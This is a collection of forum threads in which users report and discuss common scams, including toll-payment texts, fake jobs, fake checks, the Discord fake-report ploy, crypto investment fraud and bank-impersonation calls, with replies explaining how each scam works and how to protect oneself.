If you get something like this again, don‚Äôt open the attachment or click on any links. Block the number right away. 

If you‚Äôre ever unsure, visit your state‚Äôs official toll website to check if there are any violations linked to your vehicle.
- Just a scam, I always hit block and report scam. I've been getting a lot of these lately but within a group text with multiple other numbers.
- I just got one too! Which is very funny bc there's not even a link in mine. Guess I'll just throw $6.99 into the wind and hope it blows to the right place! üòù
- > There‚Äôs a special place in hell for these scammers.

Satan's call center.
- Find out who runs the legitimate tolls for his state - EZ pass is a large one. Florida is SunPass.  Go to their official website and there should be a way to check by his license plate if he has outstanding tolls.  I had a customer come in just today to show me the texts he was receiving (I work for the clerk of courts) and I was able to direct him to the proper website to check his plate.
- You don't need to see it. They will never text.
- It is a scam...

I just saw many people warning toll payment "warning" are scams especially the elderly freaking them out to no avail...

Having them petrified and in tears...
- Ah yes, the 63. That‚Äôs the toll road that goes under the Pacific Ocean to the Philippines. Tell the kids to keep their eyes open and they might see Godzilla on the drive there. ü§£
- My dad got one yesterday and he immediately noticed the country code. Glad he called me first because he was a bit panicked
- Years ago I got a notice from an FBI agent at a gmail account, letting me know that I would be getting a notice from a Nigerian Official (sadly, not a prince) that they (the FBI) had thoroughly researched and could assure me was completely legitimate, so I should go ahead and accept the offer.
- I‚Äôve had a few of those as well. I believe 63 is the Philippines.
- I‚Äôve been getting these from a +63 number as well. They also claim to be from a state I‚Äôve never been too. ü§£
- Yah what‚Äôs with the every day text from the Philippines.  Annoying
- Ha!  I received a ‚Äú63‚Äù Toll Notice text just 30 minutes ago:

   Pay your FastTrak Lane tolls by January 23, 2025. To avoid a fine and keep your license, you can pay at

   https://ezdrivema‚Ä¶‚Ä¶../usvip

  (Please reply Y, then exit the text message and open it again to activate the link, or copy the link into your Safari browser and open it)

URL EDITED. FastTrak in NOT the toll authority in my state   
Deleted.
- ü§£ü§£ü§£ü§£ü§£ü§£ü§£ü§£ü§£
- This took me OUT
- üé∂ bad boys, bad boys‚Ä¶
- Yeah, I was tempted to reply with a request to ‚Äúkiss my ass‚Äù, but that would be pointless with a spoofed number.
- I‚Äôm apparently one of the people they have to call, over and over for all eternity, who never ever EVER answers their phone.

Abandon hope and re-dial, all ye who enter here‚Ä¶ üë∫
- Hey, you weren't supposed to say anything! Lol!
- Mine was exactly the same except it was tollroadu wirh a .help domain. I believe fasttrak is used in my state but usually it‚Äôs sun pass
- Same. Yesterday though. It‚Äôs weird though because I do owe tolls on the east coast
- Fast Trak does not send text notifications. If you call their number(as I did) there is an immediate message saying ‚ÄùWe never send text messages‚Äùü§™
- Oh yeah! DEFINITELY a scam.  Thought it was funny to read this thread immediately after getting one.  THEN, not too long after posting, saw this covered on NBC national news broadcast.

This is a good reminder that email sources should be one of the first screens to filter out scams.  Outlook, gmail or other free generic email addresses will never be used by governments, large companies or other official communication.  

Even if the domain isn't generic, remember to check it out to ensure its legit; impersonation is fairly easy with mild typos (an extra letter, capital i vs lowercase L, etc) or appended words (xyzofficial, when it should just be xyz).
- Besides the good points already noted no company interviews by email. What a laugh. Totally a scam.
- I got the same email, it's a scam.  The first one was for a Project Manager position and I have no background in that.
- Hi /u/onmyti89_again, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- !advancefee
- Did you give away your email or click on a link in the email messages? 

What site is this customer support from?  Know that phishing emails are common, if you input your card details in a fake fiverr payment site then you need to contact your bank and get a new one.
- Yes clicked on link from 3 different emails which looked different but took me to the same place woth weird looking emails, it is a scam.
- I was scammed out of 900. For golden doodle Rehoming and when they were ready to suppose ship the dog, the asked for 1000. Dollar crate fee at the airport and I had only 15 min to pay so the dog could make the flight. Shame on me.
- Hi /u/seedless0, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.


**
- Yes it is a scam. Do not send any money.

The emails are phishing for your payment info. Again, if you did input your card on the fake site then you need to contact your credit card company and get new cards.

Title: Fastcarchecks is potentially a scam - be careful
Body: I was selling family farm equipment on Facebook marketplace a person pretending to be an interested buyer wanted me to go to fastcarchecks.com. I was suspicious because of their poor English and insistence that I visit the website. Even after I explained that farm equipment doesn't carry a vehicle history like a car does, they were adamant. I looked up the domain registration, and it was registered only 5 months ago (they contacted me in January 2025, it was registered in Aug 2024). Also, the contact address is in Pakistan. [WHOIS registration lookup](https://www.godaddy.com/whois/results.aspx?itc=dlp_domain_whois&domain=fastcarchecks.com). I didn't follow the website through (i.e., I didn't check it out), but I suspect it is a scam attempt.

- Yes, it's a scam. You did more due diligence than most!
- For when this happens again, which it will, don't get too bogged down with the specifics. **Any time** you're asked to run a check for a vehicle you're selling, at a site specified by the buyer, it's a scam. Just block them and wait for a genuine buyer. VIN checks etc. are the buyer's responsibility.
- More red flags in text messages:

"I'm not here to waste your time" scammers like to tell you that they're not scamming you

They keep referring to the "vehicle", sounds like a script, they don't know or care what you're actually selling.
- The scammer is following a script.  Their English must be very poor to try to deviate from it.

Title: Beware of this Discord scam
Body: So a few weeks ago, an old friend of mine on Discord messages me saying they accidentally reported me and that if I didn't contact a specific user who is Discord support about it my acc would be deleted on charges of fraud. So I was referred to this Brian Lynnggard guy, and after doing some research I found out this guy was responsible for several PayPal and gift card scams with Ryzen Gold and Apple gift cards in paying a fee to remove the charges from the account. He also gave a resume to ensure it was "legit" that upon further inspection was written by AI. However by this point, he had already gotten almost $2K from my bank account after getting a hold of my credentials. Luckily I managed to freeze my accounts before more harm could be done but I've sadly lost $1.7K to this scam and doesn't seem like I'll be getting it back anytime soon from the bank. I created a GoFundMe to potentially make back the money I had been saving since working in high school almost 4 years ago but I mostly want to put this out there to prevent this from happening to anyone ever again. If you get a message from someone you haven't spoken to in like 3+ years claiming they accidentally reported you. DO NOT FALL FOR IT. Hopefully this helps. Wish me luck on the money

Use the search box first next time.

2) lol I love the idea that discord, upon finding you have violated TOS, will go e you ample time to keep doing it while you "clear your name" and that the person's proof of employment is a resume. Even faker than the "certificate of Discord Mod" some of the scammers had mocked up.
- It's so common that we have an automod for it.
- Hi /u/seedless0, AutoModerator has been summoned to explain the Steam or Discord fake report scam.

This is a very common scam that happens either on Steam or Discord, or both.

You receive a message from someone claiming that they accidentally reported you, and they will direct you to the profile of a scammer that impersonates a Steam or Discord employee or admin. The other account will then either try to steal your Steam or Discord account. If you encounter this scam, ignore the scammers and report their accounts, including the one that says they accidentally reported you.

Remember: [the only way to contact Steam support is clicking here](https://help.steampowered.com/en/), and [the only way to contact Discord support is clicking here](https://support.discord.com/hc/en-us/requests/new).

[Here](https://i.imgur.com/DIgBZIN.png) is an example of the scam, [here](https://blog.malwarebytes.com/scams/2021/03/steam-users-dont-fall-for-the-i-accidentally-reported-you-scam/) is an article about the scam, and [here](https://help.steampowered.com/en/faqs/view/3195-9FFB-BA06-F25B) is Steam's scam page.

- >the person's proof of employment is a resume.

It always confuses me how people see that and are persuaded to believe them. Never in my life, at any of the jobs I worked at, have I showed a client or customer my resume to prove I'm a legit employee. And never in my life has a support person showed me their resume to prove they're legit. Unless I'm wrong and somewhere on Earth it's normal for employees to regularly have their resume on hand to brandish to customers like a badge. But as far as I know you use a resume to apply for jobs - that's it.

ETA: Or maybe most of the people falling for this are little kids who see a resume and automatically think: must be official and professional. It's probably that
- Hey as long as the whole deal still gets brought to people's attention then, am I right?
- Not when the same thing is reported here several times a day. And that's after the mods got rid of many extremely low-effort ones. It's so frequently reported there's even a quick automod command for it.
- We get tired of seeing the same exact thing because literally zero people know how to search before reposting.
- Yeah sure put it in the queue with the literally thousands of posts about it.
- It's such a well known scam here

Title: CoinblockMax Aiden Sterling
Body: So I know what you guys are going to say as I explain what happened. Yes I am dumb yes as a young person I fell for an elaborate scam that I should have looked more into. 
First this group comes from Instagram they add you to a whatsapp. They allow you to use a secure trading platform at first robinhood ect. They do normal stock at first too‚Ä¶then they convince you that another app in this case CoinblockMax will be better for their trading. They go full 180 and focus only on crypto coins that exist mostly only on that app. (Yes I know I should have stopped at any number of these points.) anyways you are convinced to go on this app. This app seems fine and dandy at first‚Ä¶ you put money in you do some trades it looks like you made money you may even be able to pull it out ect. Then they add you into a VIP trading option that you can‚Äôt get out of well with that they force you to partake in their ICOs and presales without your ok. They do it for you just like that. Then when you try to sell those the app crashes so your money tanks. They want you to ofcourse add more money. Well I didn‚Äôt at this point I just made the last of my 80$ work and somehow grew this probably imaginary number into a bigger number. Then they made me buy another ICO it made money. But I couldn‚Äôt pull out of the app without paying something called a management fee. That‚Äôs odd because I had never heard of that and the app charges in app fees already. So they talk about these management fees being the 10% of what you have in the app but here‚Äôs another red flag (yes there are a lot of red flags but I was desperate.) you had to pay the fees outside of the app to a random crypto wallet. I made 80$ become 3k and they made that 3k become 30k with a forced ICO and 10% of that new 30k is what I had to pay to access the app. Well I‚Äôm done at this point so I won‚Äôt. I haven‚Äôt been able to get into contact with someone who has paid the fee, all I know is today after the app update I was locked out and the group was deleted. It‚Äôs a scam for sure an elaborate long term scam. I have realized any of those ads without a page on IG without a real following and engagement are scams. This whole process took about a year they gained your trust and really screwed you in the end. I lost a lot prior to the ICO tanking. I‚Äôm ashamed and I am a crypto investor on Coinbase so I would tell people to stick to apps that are trusted even if the app isn‚Äôt listed as a scam site and has some gov license it‚Äôs a scam. 

PS the customer service is really weird and you have to talk to them about everything.

- Did you have a question or a point to make?
- **No legit company/trader/investor is using WhatsApp or Telegram. No legit company/trader/investor is approaching people on X or through a "random" text message.**

No legit company forces you to pay a "fee" or "taxes" to withdraw money. That's just a scam to suck more money out of you.

You didn't  invest money, you gave it to the scammers. I hope you understsnd this now. **There is no investing site or app, that's all lies, nothing but lies.** There is no profit. The screens that show how much you made? Just numbers on a screen to make you believe that you were making money.  Scammers make a whole fake crypto website. It's not hard to create a website. All the info and $$ figures on the site were fake, just big numbers on a screen to make you think you made money. 

Whatever you moved to their phony website is lost. Any profits they show on the screen are fake. Check out other stories on this sub. People lose thousands,  they lose all their savings.
- A point to make because when I looked this up I found nothing about it other than one other post. It‚Äôs psa sorry I didn‚Äôt label it that way.

Title: A client on Fiverr offered me as much as ‚Ç¨1,700 for an easy job.
Body: Hi! I'm a new translator on fiverr, and I got a rather unusual offer from one of my first clients. He started the conversation with the simplest "hello", and when I replied, this person asked if I could "rewrite the text" and that if I could, he had an offer for me of 40 pages, each page being 1200 words. The client offered as much as ‚Ç¨1,700 which is a very big amount for me. What immediately seemed suspicious to me was the fact that this person had an account created this month and his profile picture was a woman's face with some inscription cut out on the side, as if it had been taken from the Internet. I don't know how scammers could operate on fiverr, but I'm afraid I am having a conversation with one of them. How can I confirm this fact?

1. Are you communicating off Fiverr? WhatsApp, Telegram, etc.?

2. Is he offering to pay off Fiverr?

This scam goes (1) do onerous busywork (2) they put your pay in a fake account (3) you pay them to unlock it.

If he took you off Fiverr or offered to pay you off Fiverr, report and block.
- They are going to make YOU pay to "get your payment", and because you will have done quite a bit of work for them at this point you are more likely to pay fee after fee (all fake, of course) and NOT get anything out.

Title: Ignored unknown number this morning, called back l
Body: I am 46 years old and have not lived at home for over two decades. This morning I ignored an unknown number, and in about 5 minutes later my mom called me who's in her seventies and lives in a different city, and she said somebody called her and asked for me by name but said it rude and forceful so she hung up on them.

The number who called her and the number who called me are different numbers, but when I tried calling them both back they both had the exact same dreamy sounding on-hold music playing nobody ever spoke, until an automated message just said goodbye.

I am unnerved because they asked for me by name and I'm not sure how they would get my mom's number since I haven't lived with her for 30 years, and why would they call her.

Seems like a scam, anybody get phone calls like this?

I have never been in trouble with the law have never had any unpaid debts etc.

- All they have to do is have your name and number, then they can look up other people with the same last name in the same area code, they're likely family members.

Just block and ignore, both of you.
- Your address, phone number, relatives, people who live with you, email addresses, past addresses are all publicly available. If you do a Google search with your name or phone number, it will return multiple sites like Spokeo and Radaris that have your address, former addresses, people who live with you.  Some of the info online may be old (like ex-spouse still listed as a spouse). Some info may be incorrect (when I Google my phone number, an "old address" is listed in a state I have never even visited). But most info is available online, for anyone, either free or for a small price.

- Somebody's trying to collect an old debt, and they are calling "nearbys" and relatives. If pressed, they will say that you gave their number "as a reference."  This is a very shady tactic designed to embarrass you into paying them. You can expect your neighbors to get similar calls, whether they know you or not.
- I'm amused and relieved at how hilariously wrong they are about me.
- Scary. Thanks. Are there steps to get that stuff unlisted and removed?
- True, glad she caught it. She has mild dementia though so I wonder how long until someone can scam her.¬†


I will definitely talk to her though and remind her to always just hang up. I have already asked her to stop answering a phone calls from number she doesn't recognize but she still does it.
- Will do, thanks.
- Really? You'd think there wouldn't be a lot of people with the last name Lingonberry-8261...
- Yes, there are numerous people finder types of websites, you can send them requests to "opt out," having your information removed. For some websites it is a fairly simple process, others make it very complicated. 

There are lists and guides, which I'm sure someone will share before I get a chance. If not, I can after work.

There are also services that will send removal requests on your behalf, but I would be cautious. I have so far had success with the one I personally tried. 

It is often an ongoing process, and requests have to be done multiple times. For the most part, I would say it's considered impossible to fully remove those details from the web, so keep that in mind.
- I just posted this advice to another post on this sub: see if the AARP fraud help line can give you some guidance.

You can put a filter on her phone that weeds out unknown calls. You could (with her consent) make her assets co-owned so that she can't mortgage her house or give away her savings without your signature. I think there may be a way to receive a bcc on her emails. Perhaps you can be co-named on her credit cards so that you see the statements. Things like that.

Older adults with cognitive decline are absolutely top targets. This sub is riddled with horrible stories of pig butchering and romance scams that target older people. One of the saddest was an elderly couple who were tricked into providing bank details to "their bank." Their life savings were wiped out within minutes.
- Thank you, I really appreciate it.
- Rather than co-ownership for her house, the house can be put in a trust with the OP as trustee.  That accomplishes the safety goal you pointed out, but enables OP to receive the stepped up basis should she leave the house to him.  A lawyer can help write a will and open the trust. Bank accounts and other financial assets can also be protected in a trust.
- Please stay on top of this. As you probably know, dementia is progressive, and I can tell you from personal experience that it can progress very quickly. You need to work quickly to make sure your mom is protected. The very first thing you should do is to change her phone settings to only allow calls from people in her contacts. That won't fix everything, but it'll make it more difficult for scammers to reach her. Another thing, if she'll let you, is to take over her online banking access. That way, she can't accidentally give scammers access to her account. Next, if she uses a debit card to make purchases, switch her to a credit card. That'll give her a buffer so that, if someone gets the card info, they can't drain her account. And install her credit card app on your phone. Some of them will send real-time notifications of transactions, so turn that on. That'll allow you to see if anything weird is going on and have a better chance of stopping it.

These aren't perfect solutions, but they'll at least give her some security.

Title: This Has to Be a Scam, But I'd Like it Explained To Me
Body: So I get an email sent to me through my school's email address. I've came across scams in the past that were able to find a roll of emails for my university and they used that to send out feelers. 

The email says that they represent the upcoming World Cup, and they are looking to pay people to advertise the event by putting decals on a personal vehicle. Says it pays $400 a month. No way, that's way too good of a deal. But I bite anyways, because if it gets to a point where they are asking for bank info or payment up front for anything I'll just walk away. 

They send me an application, I fill it out. I get a text to schedule a time for someone to come to me to put the decals on my car. I schedule it thinking "okay, if someone actually shows up then maybe it is real". Next thing I know I get another text saying that my first payment will be sent through email, and I will need to print out the echeck and use my bank's mobile deposit. Uh...tf? Print out a check? Absolutely never heard of such a thing. Lo and behold there it is in my email. The amount is for $1,750. Lmao. Where did that number even come from? The original email said $400 a week. 

Anyways, so my question is what is the next step for this scam? If I try to deposit this money into my bank and it miraculously goes through, what are they going to do? What is the actual scam that they are trying to do? 

Thanks in advance for any input!

- !fakecheck

They will claim (1) you have been overpaid and you need to send money back OR (2) use the excess funds to pay the guy putting on the decals. When the bank bounces the check you are out the money you paid out

Depositing an emailed check is against your bank's TOS
- As others have said, it's a fake check scam (this variant is the car wrap scam)

[https://consumer.ftc.gov/consumer-alerts/2024/03/how-avoid-getting-wrapped-car-wrap-scam](https://consumer.ftc.gov/consumer-alerts/2024/03/how-avoid-getting-wrapped-car-wrap-scam)

You should let your school's IT know about the fake job post. It seems commonly these school emails are spoofed or compromised.

Just by responding to the initial email, you have now proven that you are receptive to scams and have probably moved to a new ‚Äúeasy mark‚Äù list. Be prepared to be targeted with many more of these (and delete them all immediately, don‚Äôt explore them)
- Emailed checks are always a scam. They are fake. If you print it out, and deposit it, your bank will discover that it is fake, take the money from your account, and then they may close your account due to fraud.

More details: In the US, bank laws require that your bank makes money available to you when you deposit a check. So your bank fronts you the money on the assumption that the check is good. But, in a few weeks, the bank will discover that the check is fraudulent (it may be drawn on a stolen account, or on a fake account). Then, the check bounces, and your bank takes back the money. Banks don't like dealing with fraud, and when you deposit a check that you printed out, that is against their terms of service, so they may also close your account, which can prevent you from opening an account at another bank.
- "We sent you too much money. Keep the $400 and send the rest back to us."

And you're out $1350. Oh, wait, you're also out the $400 they "paid" for you to do this for a week. 

And you won't know until the bank calls and tells you the check was bogus. Banks are required to make funds from a deposited check immediately available (not all of it at first). The gap in the discovery by the bank is what these clowns play on, because they know as soon as the bank makes the cash available, you'll probably spend it in some way. 

Run away. Ain't no one coming to decal your ride. Ain't no one giving you any cash.
- Checks you can print are a thing. I've gotten one from a legit source once. This sounds like it might be an overpayment scheme where they paid you money and expect you to send some back. Or they tell you to go somewhere to get the work done and pay up front with the overpayment.
- The car wrap scam is an old one. Companies are not paying random people to wrap their cars for ‚Äúadvertising‚Äù and certainly not by sending emails to random people.
- Printing out a check from someone to scan is against the terms and conditions of the bank.

It is also a fake check. And they will instruct you to send some of the money to the person or the company that provides the decals. This is how you lose your money and you will not get it back. This entity is also the same scammer. Then the check will bounce after some weeks and your bank will likely close your account and blacklist you because they're going to think you're in on the fraud and you won't be able to open account anywhere else.
- Printing an image of a check you received in an e-mail means it is definitely a scam, as that's not a legal check.

The scam is, yyou deposit the check, and then they send you a note that they overpaid you, and if you could just send them the overage, that would be great.

For them.  As, the emailed check they sent you is bogus and the funds will be clawed back,  and any money you sent them is completely gone.
- Hey you already know this is a scam, but jsyk car wrap scam has been around over 20 years and you are smart to come here first. 

No company, ever, at all, pays people per week to get their personal car wrapped. I can say this with absolute certainty, because all wrapped cars you see are company owned, company insurance, company driver/general worker on a supply run or delivery of product to their locations/on a way to a major Event they have a booth at. 

Only those situations. Everything else is them accepting liability for you and your car but not on their insurance. 

Scammers count on you not understanding US insurance and liability...and having a lack of skills, you are perfect low hanging fruit. 

No job. NO job, is gotten through a text, email, or even zoom without a full interview and resume and contract and scary people asking scary questions.
- When you deposit the check, they then have your bank info.
- Likely they'll ask you to pay the extra to whoever it is "installing the decals" because for some reason or another they can't. You PayPal/Venmo/Cash app them the money, check bounces, they got paid and disappear.
- Thank you. I appreciate the reply and the bot use. Makes perfect sense to me now.
- Hi /u/onlymodestdreams, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- There are legitimate electronic checks that can be printed out for deposit. Source: Receive these from time to time (but from a trusted source).  Those I've used have a secure link to show the check for printing, rather than being an attachment, so it's not attached in my case.
- Beat me to it
- Got it. Could you explain that like I'm five? Do they just refute the deposit and then I have to pay it back?
- Email checks are not always a scam. Check out Deluxe checks.
- I get that. They faked the email address to look like someone from within my university. Which makes sense. My school and other schools I have attended do occasionally send out information for potential part-time employment opportunities.

- It‚Äôs just not real, the check. Checks are ancient technology so banks still take some time to process. Generally trusting their depositors though, most banks make amounts for smaller checks available immediately. That window between available and processed (failed) is where scammers steal from the unsuspecting or ignorant who know nothing about how banks work and think the money is as good as theirs.

Title: Google Assistant Call Screening?
Body: I have been using GA lately (I guess my number is exposed/leaked) to screen calls from numbers that are not in my phone book. Often times, whoever calls me (scammer/spammer) would just hang up. I usually just block them and report the number as spam.

My question is: do you use it to screen calls? Or do you simply let them go to your voicemail? I don't know, maybe it is not a good idea to use it because the spammers know that it is an active number.

Title: Typical cold call art commission scam
Body: I was cold called via a writing platform. Figured it's been some 10 years since I've posted anything on that site, a DM from someone is either going to be straight up scammy, or a real person.

They complimented some stories I had written on a platform for writing that cannot be traditionally published (fan fiction is an example) and gave me the vibe they might be legit, just potentially ESL and broken English is just fine by me if you're nice. Their Instagram is solely art related, which isn't a red flag in the reading/writing community. But asking to draw something for me - nope, done, bye, all respect gone even if you are legit.

Took a wrong turn literally straight out of the gate. This isn't my first rodeo with "cover artists" trying to weasel money out of me for a product I will never receive. I don't write solely online, nor solely fan fiction, so people think I have money to spare. I do, but for Taco Bell Baja Blast, not scammers. They haven't tricked me yet and today was not the day to try.

- "Have the kind of day you deserve" ü§£
- Had someone ask if they could use one of my Instagram pictures as inspiration for a mural.  Said sure and asked which one they were thinking of and was surprised by the one they selected, but didn't really care.  They then sent me links to their other works and told me I'd be paid as well, but I didn't respond because didn't care, first of all, and was also at work.

Gonna guess the goal was similar to this, but they didn't have any luck
- This scam is just, they take your money in exchange for some AI slop.
- Nice snark!
- I get at least one of these a week usually through ff.net, at this point I just fuck with them.
- I'd bet they are trying to sell A.I. generated art.
- It's just so perfect. Any time I see someone use it in retaliation, massive bonus points. It just hits right.
- This is a common scam, named the muse scam. Bottom line: they steal your money. 

Usually they insist on paying you 500 or 1000, send you a fake check, then ask you to send money to their "artist" to buy materials (the money goes to the scammers). Then in a few weeks, your bank discovers that the check is fake, take back the money from your account, and you lost whatever you gave to the scammer.
- I've had similar, with artwork of mine. They wanted me to pay them to have them post my art to their wide range of followers. All 15 of them. Who would've thought they'd turn to rage when I laughed and said no.

A lot of cold calling like this will end up nothing more than a payment scam of some kind where you pay and never receive the product or service. They're typically pretty responsive individuals, too, and don't use many scripted responses, just a guideline. Reel them in with compliments, boost your ego, then close the sale, and ask for the sale when told no.
- Yup, sounds like the !muse scam. Why would anyone need permission to be used as "inspiration"? lol
- Good enough scam for me. Especially since the method of attempt is common, whether or not they intend to actually use AI.

And, to be really fair, their art was too poorly made to be AI. I wish that were more of a compliment.
- Appreciate it! I have horrible food poisoning and I'm not taking anybodys crap today lmao
- Spot on for the location of where this one came from.

I regret not adding a bit more to the conversation, but I was so shocked by the message. It has been 5 years since I've gotten an email about a DM from FF, so I kinda went with the benefit of the doubt and somehow found myself a little grumpy about it. Shocker, because I wasn't surprised by the time of their second message.
- Their profile was indicative of a *very* inexperienced digital artist. They could have still used AI within the scam they tried to pull with me, but they definitely didn't use AI on their profile posts.
- Especially since, not that I think I'm bad looking or anything, they'd just picked one of my smiling selfies while in the paddock at the racetrack.  They would've had better response (though still wouldn't have succeeded with me) if they'd picked one of my cooler on track pictures lol
- Hi /u/xtkbilly, AutoModerator has been summoned to explain the Muse scam.

The muse scam is a variant of the [fake check scam](https://consumer.ftc.gov/articles/how-spot-avoid-report-fake-check-scams) in which the scammer will contact the victim over social media and claim to want to use their image for an art project. The scammer will often use a stolen social media account to increase their credibility. They will offer a generous sum of money and offer to pay via check, and the victim is instructed to send money to the scammer for ‚Äúmaterials‚Äù via an irreversible method. The victim is under the illusion that the funds cleared when the bank makes the money available thanks to current regulations. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months.

If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. You can summon the fake check automoderator explanation using the trigger fakecheck. Thanks to redditor aNeatHat for this script.

This is a scam where a scammer impersonates an artist. For the scam where a scammer targets artists, call the automoderator trigger (artist)

- Yeah. It's strange and the last 6 months I've probably gotten at least 15 messages. And I will often tell them that if they want to work with me they got to go leave a review on the story they read. Then I ghost. 

Other times I tell them no I'm sorry you can't illustrate anything from my story because I'm in a contract with another artist.
- Good bot
- [deleted]
- Yeah I always thought it was really weird that they would ask to draw something and then ask for money I've had people draw stuff for my stories in the past and they did it because they enjoyed the story they didn't want me to pay them like it's fucked up.

Title: Just Fell For an Employment Scam/MLM Interview - If No Deep Personal Info Was Given, Am I Safe?
Body: Howdy, 

  
I just attended a group "interview" with One-Up NYC. I have since read that it is a semi-scam organization. They gave a meaningless talk and then had us fill out a Google Form for further interviews. Very meaningless, just what did you learn from the talk, tell us about a good experience in your life, etc. No personal details beyond first and last name and email were given. I assume I'm safe but wanted to check.

Goes to show anyone can fall for these - The interview email was unsolicited, but I had just applied to some temp agencies, so I figured it was through them. Be careful!

Or maybe I can have Siri make a message for me in an Australian voice. :)

- > And now with AI...

Unless there is someplace where you are using a voiceprint as authentication and the fraudster knows about it, them being able to AI clone your voice is more or less pointless. Most audio impersonation frauds don't need the voice to sound the same; they rely on getting the target to panic and stop listening closely. And my bank, for instance, doesn't allow for entirely verbal transactions. If I'm not in the bank, talking face-to-face with someone, I have to prove my identity by other means before they'll take verbal instructions.
- These are phishing calls. It's a good practice never to answer a call from a number you don't recognize. At this point, those are nearly always junk. If it's someone real, they'll leave a voicemail. 

I'm not sure what a scammer could do with AI cloning your voicemail message, but if you're worried, yeah: change your message to an automated one.

Title: Scam caller posing as Bank of America (800)688-6086
Body: Someone from this number called my husband claiming we had potentially fraudulent activity on our Bank of America account.  I looked up the account right away and saw no pending transactions.  

Thankfully when I looked their phone number up online, while my husband kept them busy, I found an older archived note on Reddit suggesting this was indeed a scam.  They said they were attempting to charge us $9379 and $7547 via wire so they wanted to ‚Äúconfirm‚Äù with us we meant to do so. We of course told them no. I chatted online with Bank of America while hubby slowly talked to them, who confirmed that 800 number exists NOWHERE in their system and to promptly block it from both our phones. 

It felt good telling the scammer we knew they were frauds and to F off. :)

 I wanted people to be aware this scam is still going on.

- There's a simpler solution:

You can never trust Caller ID ever.
- You really didn't need to 'keep them on the line', they intended to keep *you* on the line anyway. All you did was imply to them that you're likely to engage a scammer. So, expect more calls trying to scam you, likely with different scams, for days, weeks, maybe even months.

Best thing to do is cut the call short, if you answer at all. When a call looks like it's coming from your bank, you decline the call, let it go to voicemail, and manually call your bank from the number on your debit card. Don't think "But the number on caller ID was the same as the one on my card!" - it *looked* like it was, because there's a couple of ways to spoof caller ID, and it's as trivial as filling the 'name' field with a phone number - say the actual number of your bank.
- Good point!
- My husband received the call. I have Robokiller so no calls unknown (or even texts) get through.  They knew we suspected and the final f*ck off at the end  solidified it.
- Well, he's going to get more.

Title: Received a "You hit my car" call from a private number, is it a scam?
Body: I just randomly thought of this and thought to ask about it, but basically a few months ago, I was just minding my own business when I got a call from a private number. I have received calls from private numbers before such as from college or my therapist, so I didn't think too much about it and answered.

Some guy was on the other end, sounded American and spoke fluently. Asked me if they were speaking to (my name) a few times, and each time I responded that they were talking to the right person without saying "yes." Also asked if I lived in (my region), and I replied that I did. Eventually, they were asking if I hit someone's car, which I hadn't in years. Said that their car was hit and that "I" left a note with my name and phone number. I told them that I didn't hit anyone, and certainly didn't leave a note on anyone's car. 

They started getting accusatory, which I replied with some reasoning along the lines of: "Why would I hit your car and leave a note with my information, just to later deny hitting your car?" Then they asked if I deny responsibility. I said that I am taking no responsibility since I didn't do anything. They then announced that if I am denying responsibility, then they will be taking it to law enforcement. I was already weirded out by the whole call, but this just immediately set off alarm bells in my head. I just announced that it was a scam and hung up.

So far, haven't had law enforcement show up or anything like that. To me, it absolutely sounds like a scam since it came from a private number and the guy quite quickly jumped to the threat of law enforcement. 

This was a scam of some sort, right? If so, what kind of scam was it? Just to be clear, I didn't give the guy any information he didn't already have.

- Absolutely a scam. Walk away.
- It's a myth that you shouldn't say "yes" while talking to an unknown caller.
- First words out of your mouth should be who is this.  Answer nothing.  Hang up.  Block number.
- It's got to be a scam, cuz how would he have your number lol?
- Common scam, they're looking for someone they can intimidate into sending Venmo or Applebee's gift cards.

Set your phone / carrier to block private number entirely.
- Ignore them, if they want money they should take it up with the insurance company.
